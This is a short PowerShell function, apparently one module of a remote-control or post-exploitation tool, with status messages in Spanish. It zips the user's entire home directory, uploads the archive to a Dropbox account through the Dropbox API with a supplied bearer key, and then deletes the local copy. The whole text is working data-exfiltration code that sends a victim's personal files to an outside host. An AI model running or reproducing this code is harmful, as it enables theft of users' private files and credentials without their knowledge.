function download{
  param([String]$APIKey)
  
  $Out = "$env:LOCALAPPDATA\Temp\Home.zip"
  Compress-Archive -Path $env:HOMEPATH -DestinationPath $Out
  $arg = '{ "path": "/home.zip", "mode": "add", "autorename": true, "mute": false }'
  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
  $headers.Add("Authorization", "Bearer $APIKey")
  $headers.Add("Dropbox-API-Arg", $arg)
  $headers.Add("Content-Type", 'application/octet-stream')
  
  $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $Out -Headers $headers

  if($response.is_downloadable){
    $global:execute = "Los datos están disponibles en tu Dropbox"
  }else{
    $global:execute = "Algo ha ocurrido cuando se subia el fichero"
  }
  Remove-Item $Out
}
